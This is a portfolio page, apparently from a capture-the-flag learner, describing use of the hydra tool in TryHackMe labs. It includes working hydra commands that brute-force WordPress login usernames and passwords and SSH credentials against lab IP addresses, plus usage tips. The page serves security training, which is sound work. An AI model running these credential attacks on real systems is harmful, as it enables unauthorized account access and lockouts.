---
layout: page
title: hydra
description: Performed credential brute-force dictionary attacks.
img:
importance: 2
category: red
internal_proof: /boxes/29_cronos/
related_publications: false
---

<div class="row justify-content-sm-center">
  <div class="col-sm-4 mt-3 mt-md-0">
    {% include figure.liquid loading="eager" path="assets/img/hydra/logo.png" title="hydra" class="img-fluid rounded z-depth-1" %}
  </div>
</div>

<br />
<h2>Link</h2>
<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener noreferrer">Software Link</a>

<br />
<h2>Process</h2>

<h3>How you used it</h3>

<br />
<table>
  <thead>
    <tr>
      <th>Category</th>
      <th>Usage</th>
      <th>Proof</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Brute-Force Password</td>
      <td>Brute-Force HTTP(s) login passwords.</td>
      <td>
        <ul>
          <li><a href="{{ '/boxes/24_mrrobot/' | relative_url }}">THM Mr. Robot</a></li>
        </ul>
      </td>
    </tr>
    <tr>
      <td>Brute-Force Usernames</td>
      <td>Brute-Force HTTP(S) login usernames.</td>
      <td>
        <ul>
          <li><a href="{{ '/boxes/24_mrrobot/' | relative_url }}">THM Mr. Robot</a></li>
        </ul>
      </td>
    </tr>
    <tr>
      <td>Brute-Force SSH</td>
      <td>Brute-Force SSH for easy foothold.</td>
      <td>
        <ul>
          <li><a href="{{ '/boxes/44_library/' | relative_url }}">THM Library</a></li>
        </ul>
      </td>
    </tr>
  </tbody>
</table>

<br />
<h3>Commands / Cheatsheet</h3>

<ul>
  <li>Brute-Force Password</li>
  {% capture passwords %}
hydra -l Elliot -P fsocity.dic 10.10.145.112 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:The password you entered"
  {% endcapture %}
  {% include terminal.html language='bash' title='Brute-Force Password' content=passwords %}

  <li>Brute-Force Usernames</li>
  {% capture Usernames %}
hydra -L fsocity.dic -p admin 10.10.11.55 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.11.55%2Fwp-admin%2F&testcookie=1:Invalid Username"
  {% endcapture %}
  {% include terminal.html language='bash' title='Brute-Force Usernames' content=Usernames %}

  <li>Brute-Force SSH</li>
  {% capture ssh %}
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.208 ssh
  {% endcapture %}
  {% include terminal.html language='bash' title='Brute-Force SSH' content=ssh %}

</ul>

<br />
<h3>Common mistakes</h3>
<ul>
  <li>Using the wrong wordlist.  Sometimes, it takes multiple lists to find the goods.</li>
  <li>Jumping to Brute-Force right away.  Rockyou should be the FIRST thing you try.</li>
  <li>Failing to checking lockout policy and locking out accounts.</li>
</ul>

<br />
<h3>Tips / Best use cases</h3>
<ul>
  <li>Always get permission to run the tool on the target. </li>
  <li>Use service specific wordlists.  Consider using a tool like cewl for a custom list. </li>
  <li>Use the right failure criteria to check.</li>
</ul>